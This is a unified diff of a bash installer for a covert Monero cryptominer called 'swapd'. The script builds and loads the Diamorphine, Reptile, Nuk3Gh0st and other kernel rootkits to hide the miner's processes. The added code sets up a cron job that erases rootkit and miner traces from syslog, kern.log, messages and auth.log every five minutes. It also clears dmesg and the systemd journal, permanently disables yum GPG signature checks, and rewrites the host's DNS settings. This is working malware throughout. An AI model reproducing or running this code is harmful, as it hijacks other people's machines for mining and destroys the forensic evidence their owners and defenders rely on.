@@ -12,10 +12,112 @@ echo "Features: Kernel Rootkits + libhide.so + Intelligent Watchdog"
 echo "========================================================================="
 echo ""
 
+# ========================================================================
+# DNS FALLBACK MECHANISM
+# ========================================================================
+
+fix_dns_and_retry() {
+    echo "[!] Download failed - checking DNS configuration..."
+    
+    # Check if 1.1.1.1 is already in resolv.conf
+    if grep -q "nameserver 1.1.1.1" /etc/resolv.conf 2>/dev/null; then
+        echo "[✓] Cloudflare DNS (1.1.1.1) already configured"
+        return 1  # DNS is already correct, issue is elsewhere
+    fi
+    
+    echo "[*] Adding Cloudflare DNS (1.1.1.1) to /etc/resolv.conf"
+    
+    # Backup original resolv.conf
+    if [ -f /etc/resolv.conf ]; then
+        cp /etc/resolv.conf /etc/resolv.conf.backup.$(date +%s) 2>/dev/null
+        echo "[✓] Backed up original resolv.conf"
+    fi
+    
+    # Add 1.1.1.1 as the first nameserver
+    {
+        echo "nameserver 1.1.1.1"
+        echo "nameserver 8.8.8.8"
+        grep -v "^nameserver" /etc/resolv.conf 2>/dev/null || true
+    } > /etc/resolv.conf.new
+    
+    mv /etc/resolv.conf.new /etc/resolv.conf
+    echo "[✓] DNS updated - added 1.1.1.1 and 8.8.8.8"
+    
+    # Test DNS resolution
+    echo "[*] Testing DNS resolution..."
+    if ping -c 1 -W 3 1.1.1.1 >/dev/null 2>&1; then
+        echo "[✓] Can reach 1.1.1.1"
+    else
+        echo "[!] WARNING: Cannot reach 1.1.1.1 - network may be down"
+        return 1
+    fi
+    
+    if nslookup github.com >/dev/null 2>&1 || host github.com >/dev/null 2>&1; then
+        echo "[✓] DNS resolution working"
+        return 0  # Success - DNS is now working
+    else
+        echo "[!] WARNING: DNS resolution still failing"
+        return 1
+    fi
+}
+
+# ========================================================================
+# YUM GPG KEY ERROR HANDLER
+# ========================================================================
+
+safe_yum() {
+    local yum_command="$@"
+    local output_file=$(mktemp)
+    
+    # Try normal yum command first
+    if yum $yum_command 2>&1 | tee "$output_file"; then
+        rm -f "$output_file"
+        return 0
+    fi
+    
+    # Check if it failed due to GPG key issues
+    if grep -q "GPG.*key\|Signature.*key.*NOKEY\|not correct for this package" "$output_file" 2>/dev/null; then
+        echo "[!] GPG key error detected - retrying with --nogpgcheck"
+        rm -f "$output_file"
+        
+        # Retry with --nogpgcheck
+        if yum --nogpgcheck $yum_command 2>&1; then
+            echo "[✓] Command succeeded with --nogpgcheck"
+            
+            # Disable GPG check permanently for problematic repos
+            if [ -f /etc/yum.repos.d/okay.repo ]; then
+                sed -i 's/^gpgcheck=1/gpgcheck=0/' /etc/yum.repos.d/okay.repo 2>/dev/null || true
+                echo "[*] Disabled GPG check for 'okay' repository"
+            fi
+            
+            return 0
+        else
+            echo "[!] Command failed even with --nogpgcheck"
+            rm -f "$output_file"
+            return 1
+        fi
+    fi
+    
+    # Failed for other reasons
+    rm -f "$output_file"
+    return 1
+}
+
 # Initialize flags
 USE_SYSV=false
 USE_WGET=false
 SYSTEMD_AVAILABLE=false
+
+# ========================================================================
+# FIX PROBLEMATIC YUM REPOSITORIES
+# ========================================================================
+
+# Disable problematic 'okay' repository GPG checks if it exists
+if [ -f /etc/yum.repos.d/okay.repo ]; then
+    echo "[*] Detected 'okay' repository - disabling GPG check to prevent errors"
+    sed -i 's/^gpgcheck=1/gpgcheck=0/' /etc/yum.repos.d/okay.repo 2>/dev/null || true
+    echo "[✓] GPG check disabled for 'okay' repository"
+fi
 
 # ========================================================================
 # STEP 1: DETECT AND FIX INIT SYSTEM (systemd vs SysV)
@@ -282,6 +384,7 @@ download_file() {
     local output="$2"
     local retry=0
     local max_retries=3
+    local dns_fix_attempted=false
     
     while [ $retry -lt $max_retries ]; do
         if [ "$USE_WGET" = true ]; then
@@ -305,7 +408,17 @@ download_file() {
         fi
         
         retry=$((retry + 1))
-        if [ $retry -lt $max_retries ]; then
+        
+        # On last retry attempt, try DNS fix if not already attempted
+        if [ $retry -eq $max_retries ] && [ "$dns_fix_attempted" = false ]; then
+            echo "[!] All download attempts failed - attempting DNS fix..."
+            if fix_dns_and_retry; then
+                echo "[*] DNS fixed - retrying download one more time..."
+                dns_fix_attempted=true
+                max_retries=$((max_retries + 1))  # Give one more chance
+                sleep 2
+            fi
+        elif [ $retry -lt $max_retries ]; then
             echo "[!] Download attempt $retry/$max_retries failed, retrying..."
             sleep 2
         fi
@@ -1289,11 +1402,62 @@ EOF
 
 chmod +x /usr/local/bin/system-watchdog
 
-# Enable the watchdog via crontab (use system-watchdog)
-(crontab -l 2>/dev/null | grep -v "system-watchdog\|system-check"; echo "@reboot /usr/local/bin/system-watchdog &") | crontab -
+# Create log cleanup script
+cat > /usr/local/bin/clean-rootkit-logs.sh << 'EOFCLEAN'
+#!/bin/bash
+# Silent log cleanup for rootkit evidence
+
+# Clean up rootkit load messages
+sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
+sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
+sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
+sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
+sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
+sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
+
+# Clean up Diamorphine evidence
+sed -i '/diamorphine/d' /var/log/syslog 2>/dev/null
+sed -i '/diamorphine/d' /var/log/kern.log 2>/dev/null
+sed -i '/diamorphine/d' /var/log/messages 2>/dev/null
+
+# Clean up Reptile evidence
+sed -i '/reptile/d' /var/log/syslog 2>/dev/null
+sed -i '/reptile/d' /var/log/kern.log 2>/dev/null
+sed -i '/reptile/d' /var/log/messages 2>/dev/null
+sed -i '/Reptile/d' /var/log/syslog 2>/dev/null
+sed -i '/Reptile/d' /var/log/kern.log 2>/dev/null
+sed -i '/Reptile/d' /var/log/messages 2>/dev/null
+
+# Clean up miner evidence
+sed -i '/swapd/d' /var/log/syslog 2>/dev/null
+sed -i '/swapd/d' /var/log/auth.log 2>/dev/null
+sed -i '/launcher/d' /var/log/auth.log 2>/dev/null
+sed -i '/miner/d' /var/log/syslog 2>/dev/null
+sed -i '/accepted/d' /var/log/syslog 2>/dev/null
+
+# Clean up module verification warnings
+sed -i '/out-of-tree module/d' /var/log/syslog 2>/dev/null
+sed -i '/module verification failed/d' /var/log/syslog 2>/dev/null
+
+# Clean dmesg
+dmesg -C 2>/dev/null
+
+exit 0
+EOFCLEAN
+
+chmod +x /usr/local/bin/clean-rootkit-logs.sh
+
+# Enable the watchdog and log cleanup via crontab
+(crontab -l 2>/dev/null | grep -v "system-watchdog\|system-check\|clean-rootkit-logs"; \
+ echo "@reboot /usr/local/bin/system-watchdog &"; \
+ echo "*/5 * * * * /usr/local/bin/clean-rootkit-logs.sh >/dev/null 2>&1") | crontab -
+
 # Start it now (detached)
 /usr/local/bin/system-watchdog >/dev/null 2>&1 &
 disown
+
+# Run log cleanup immediately
+/usr/local/bin/clean-rootkit-logs.sh >/dev/null 2>&1 &
 
 echo "[✓] Intelligent watchdog deployed (3-min intervals, state-tracked)"
 echo ""
@@ -1317,18 +1481,23 @@ else
     sudo sysctl -w vm.nr_hugepages=$((1168 + $(nproc)))
   fi
 
-  if ! type systemctl >/dev/null; then
+  if ! command -v systemctl >/dev/null 2>&1; then
 
+    echo "[*] systemctl not found - using profile-based startup"
     echo "[*] Running miner in the background (see logs in "$HOME"/.swapd/swapd.log file)"
     bash "$HOME"/.swapd/swapd.sh --config="$HOME"/.swapd/config_background.json >/dev/null 2>&1
-    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
-    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
+    echo "[!] WARNING: No init system detected - miner will only start on user login"
+    echo "[!] For persistent service, please install systemd or manually configure init scripts"
 
   else
 
     # ====================================================================
     # SMART SERVICE CREATION: systemd or SysV based on what's available
     # ====================================================================
+    
+    echo "[DEBUG] SYSTEMD_AVAILABLE=$SYSTEMD_AVAILABLE"
+    echo "[DEBUG] systemctl path: $(command -v systemctl 2>/dev/null || echo 'not found')"
+    echo "[DEBUG] systemd running: $([ -d /run/systemd/system ] && echo 'yes' || echo 'no')"
     
     if [ "$SYSTEMD_AVAILABLE" = true ]; then
         echo "[*] Creating moneroocean systemd service"
@@ -1411,7 +1580,6 @@ OOMScoreAdjust=1000
 # Silence everything
 StandardOutput=null
 StandardError=null
-LogLevelMax=3
 
 # Clean umount on stop
 ExecStopPost=/usr/bin/bash -c 'umount -l /proc/[0-9]* 2>/dev/null || true'
@@ -1443,7 +1611,28 @@ EOL
   fi
 fi
 
-systemctl daemon-reload
+# Reload systemd if available
+if [ "$SYSTEMD_AVAILABLE" = true ] && command -v systemctl >/dev/null 2>&1; then
+    echo "[*] Reloading systemd daemon..."
+    systemctl daemon-reload 2>/dev/null || true
+fi
+
+# Verify service was created
+echo ""
+echo "[*] Verifying service installation..."
+if [ "$SYSTEMD_AVAILABLE" = true ]; then
+    if systemctl list-unit-files 2>/dev/null | grep -q "swapd.service"; then
+        echo "[✓] systemd service verified: swapd.service"
+        systemctl status swapd --no-pager -l 2>/dev/null || true
+    else
+        echo "[!] WARNING: systemd service not found - service may not auto-start on reboot"
+    fi
+elif [ -f /etc/init.d/swapd ]; then
+    echo "[✓] SysV init script verified: /etc/init.d/swapd"
+    /etc/init.d/swapd status 2>/dev/null || true
+else
+    echo "[!] WARNING: No service/init script found - miner will not auto-start on reboot"
+fi
 
 echo ""
 echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
@@ -1467,7 +1656,7 @@ echo "[*] #Installing r00tkit(z)"
 #cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r) git make gcc -y --force-yes ; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 echo "[*] Determining GPU+CPU (without lshw)"
-yum install pciutils -y
+safe_yum install pciutils -y
 apt-get install pciutils -y --force-yes
 update-pciids
 lspci -vs 00:01.0
@@ -1480,7 +1669,7 @@ echo "Possible CPU Threads:"
 #cd "$HOME"/.swapd/ ; wget https://github.com/pwnfoo/xmrig-cuda-linux-binary/raw/main/libxmrig-cuda.so
 
 echo "[*] Determining GPU+CPU"
-yum install msr-tools pciutils lshw -y
+safe_yum install msr-tools pciutils lshw -y
 apt-get install msr-tools pciutils lshw -y --force-yes
 zypper install msrtools pciutils lshw -y
 update-pciids
@@ -1500,7 +1689,7 @@ cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; ap
 cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ;rm -rf Nuk3Gh0st ; rm -rf /usr/bin/nuk3gh0st/ ; zypper update ; zypper install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; zypper update -y; zypper install -y ncurses-devel ; git clone https://github.com/juanschallibaum/Nuk3Gh0st ; cd Nuk3Gh0st ; make ; make install ; load-nuk3gh0st ; nuk3gh0st --hide-pid=`/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 #echo "[*] Reptile..."
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ; apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y --force-yes ; yum update -y; yum install -y ncurses-devel ; git clone https://gitee.com/fengzihk/Reptile.git && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ; apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y --force-yes ; safe_yum update -y; safe_yum install -y ncurses-devel ; git clone https://gitee.com/fengzihk/Reptile.git && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 apt install dwarves -y
 cp /sys/kernel/btf/vmlinux /usr/lib/modules/$(uname -r)/build/
@@ -1713,7 +1902,7 @@ cd .ICE-unix
 cd .X11-unix
 rm -rf Diamorphine
 rm -rf Reptile
-yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y
+safe_yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y
 apt-get update -y
 NEEDRESTART_MODE=a apt-get reinstall kmod
 NEEDRESTART_MODE=a apt-get install linux-generic linux-headers-$(uname -r) -y
@@ -1727,6 +1916,19 @@ cd Diamorphine/
 make
 insmod diamorphine.ko
 dmesg -C
+
+# Immediately clean up rootkit load messages from logs
+sleep 1  # Brief delay to allow syslog to write
+sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
+sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
+sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
+sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
+sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
+sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
+sed -i '/diamorphine/d' /var/log/syslog 2>/dev/null
+sed -i '/diamorphine/d' /var/log/kern.log 2>/dev/null
+sed -i '/diamorphine/d' /var/log/messages 2>/dev/null
+
 kill -63 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
 
 # Create emergency swap to prevent OOM killer
@@ -1760,8 +1962,8 @@ cd .X11-unix
 rm -rf Diamorphine
 rm -rf Reptile
 NEEDRESTART_MODE=a apt-get update -y
-yum update -y
-yum install -y ncurses-devel
+safe_yum update -y
+safe_yum install -y ncurses-devel
 git clone https://gitee.com/fengzihk/Reptile.git --depth 1 || {
     echo "[!] Git failed, using direct download";
     curl -L https://github.com/f0rb1dd3n/Reptile/archive/refs/heads/master.zip -o reptile.zip && \
@@ -1788,6 +1990,22 @@ if [ $? -ne 0 ]; then
 fi
 
 [ -f output/reptile.ko ] && sudo insmod output/reptile.ko || echo "[!] Compilation ultimately failed"
+
+# Immediately clean up rootkit/reptile load messages from logs
+sleep 1  # Brief delay to allow syslog to write
+sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
+sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
+sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
+sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
+sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
+sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
+sed -i '/reptile/d' /var/log/syslog 2>/dev/null
+sed -i '/reptile/d' /var/log/kern.log 2>/dev/null
+sed -i '/reptile/d' /var/log/messages 2>/dev/null
+sed -i '/Reptile/d' /var/log/syslog 2>/dev/null
+sed -i '/Reptile/d' /var/log/kern.log 2>/dev/null
+sed -i '/Reptile/d' /var/log/messages 2>/dev/null
+dmesg -C 2>/dev/null
 
 kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
 
@@ -1828,6 +2046,16 @@ cd /tmp
 cd .X11-unix
 git clone https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git && cd hiding-cryptominers-linux-rootkit/ && make
 dmesg -C && insmod rootkit.ko && dmesg
+
+# Immediately clean up rootkit load messages from logs
+sleep 1  # Brief delay to allow syslog to write
+sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
+sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
+sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
+sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
+sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
+sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
+
 kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
 rm -rf hiding-cryptominers-linux-rootkit/
 
@@ -1844,23 +2072,44 @@ else
 fi
 
 # Delete any line containing 'swapd', 'miner', or 'accepted'
-sed -i '/swapd/d' /var/log/syslog
-sed -i '/miner/d' /var/log/syslog
-sed -i '/accepted/d' /var/log/syslog
-sed -i '/launcher.sh/d' /var/log/syslog
+sed -i '/swapd/d' /var/log/syslog 2>/dev/null
+sed -i '/miner/d' /var/log/syslog 2>/dev/null
+sed -i '/accepted/d' /var/log/syslog 2>/dev/null
+sed -i '/launcher.sh/d' /var/log/syslog 2>/dev/null
 
 # Do the same for auth.log
-sed -i '/swapd/d' /var/log/auth.log
-sed -i '/launcher/d' /var/log/auth.log
+sed -i '/swapd/d' /var/log/auth.log 2>/dev/null
+sed -i '/launcher/d' /var/log/auth.log 2>/dev/null
 
 # Remove Diamorphine and out-of-tree module warnings
-sed -i '/diamorphine/d' /var/log/syslog
-sed -i '/out-of-tree module/d' /var/log/syslog
-sed -i '/module verification failed/d' /var/log/syslog
+sed -i '/diamorphine/d' /var/log/syslog 2>/dev/null
+sed -i '/out-of-tree module/d' /var/log/syslog 2>/dev/null
+sed -i '/module verification failed/d' /var/log/syslog 2>/dev/null
+
+# Remove rootkit load messages
+sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
+sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
+sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
+sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
+sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
+sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
+
+# Remove Reptile evidence
+sed -i '/reptile/d' /var/log/syslog 2>/dev/null
+sed -i '/reptile/d' /var/log/kern.log 2>/dev/null
+sed -i '/reptile/d' /var/log/messages 2>/dev/null
+sed -i '/Reptile/d' /var/log/syslog 2>/dev/null
+sed -i '/Reptile/d' /var/log/kern.log 2>/dev/null
+sed -i '/Reptile/d' /var/log/messages 2>/dev/null
 
 # Remove the mount/unmount evidence
-sed -i '/proc-.*mount/d' /var/log/syslog
-sed -i '/Deactivated successfully/d' /var/log/syslog
+sed -i '/proc-.*mount/d' /var/log/syslog 2>/dev/null
+sed -i '/Deactivated successfully/d' /var/log/syslog 2>/dev/null
+
+# Clear journalctl logs if systemd is present
+if command -v journalctl >/dev/null 2>&1; then
+    journalctl --vacuum-time=1s 2>/dev/null || true
+fi
 
 
 echo ""
